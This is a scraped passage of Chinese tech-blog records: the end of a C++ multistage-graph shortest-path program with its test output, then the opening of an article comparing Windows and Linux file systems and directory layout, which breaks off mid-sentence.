id=\"crayon-5b4a935ca7a84983046531-95\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push_back</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-96\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-97\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">front</span><span class=\"crayon-sy\">_</span>index<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-98\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push_back</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-99\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-100\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-101\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-102\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-103\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-104\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-105\"><span class=\"crayon-m\">private</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-106\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">graph</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 图的数组表示</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-107\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">node_count</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 结点个数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-108\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                </span><span class=\"crayon-v\">no_edge</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 无通路</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-109\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                </span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 目的结点</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-110\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">                </span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 最短路径</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-111\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">shortest_path</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 最短路径</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-112\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-113\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-114\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-115\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-116\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-117\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">graph</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-118\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-119\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">resize</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-120\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-121\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-122\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-123\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-124\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-125\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-126\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-127\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-128\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-129\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-130\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-131\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-132\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-133\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-134\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-135\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-136\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-137\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-138\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-139\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-140\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-141\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-142\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-143\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-144\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-145\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-146\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">ss_shortest_paths </span><span class=\"crayon-e\">ssp</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-147\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ssp</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">shortest_paths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-148\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ssp</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">print_spaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a84983046531-149\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a84983046531-150\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0265 seconds] -->\r\n<p><strong>测试数据（图）</strong></p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/06/eec11cb6eb44d153d5f26ca0d45c3494.jpg\"><img class=\"aligncenter size-full wp-image-114069\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/eec11cb6eb44d153d5f26ca0d45c3494.jpg\" alt=\"2010110113034430\"></a></p>\n<p><strong>测试结果</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a935ca7a98735973521\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmin weight : 8\r\npath: 0 2 6 9 10</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a935ca7a98735973521-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a935ca7a98735973521-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a935ca7a98735973521-1\"><span class=\"crayon-e\">min </span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a935ca7a98735973521-2\"><span class=\"crayon-v\">path</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114061\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114061votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114061\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,分支", "url": "http://blog.jobbole.com/114061/", "url_obj_id": "17234c664be7a7620fca5c849015008f"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/59d49abe8909a122bc2c9aa43b71e3bb.png"], "title": "比起 Windows，怎样解读 Linux 的文件系统与目录结构？", "create_date": "2018/06/06 ·", "praise_num": 1, "fav_num": 4, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.infoq.com/cn/articles/how-to-read-linux-file-system-and-directory-structure\">吕凯</a>   </div><p>Linux 和Windows的文件系统有些不同，在学习使用 Linux 之前，若能够了解这些不同，会有助于后续学习。</p>\n<p>本文先对Windows和 Linux 上面文件系统原理、组织概念进行区分，并给出例子、列举两者的优缺点以具体说明，最后较为详细地介绍了 Linux 系统的目录结构。</p>\n<h2>Windows 和 Linux 文件系统</h2>\n<p>下面将介绍启动Windows和 Linux 后，在文件系统的角度上，它们分别是怎样看待自己世界的。</p>\n<h3>访问原理</h3>\n<p>在Windows系统中， 一切东西都是存放在硬盘上的。启动系统后，先确定硬盘，再确定硬盘上的分区以及每个分区所对应文件系统，最后是存放在某个分区特定的文件系统中的文件。 也就是说，Windows是通过 <strong>“某个硬盘-硬盘上的某个分区-分区上的特定文件系统-特定文件系统中的文件”</strong> 这样的顺序来访问到一个文件的。</p>\n<p>但是与Windows不同, Linux 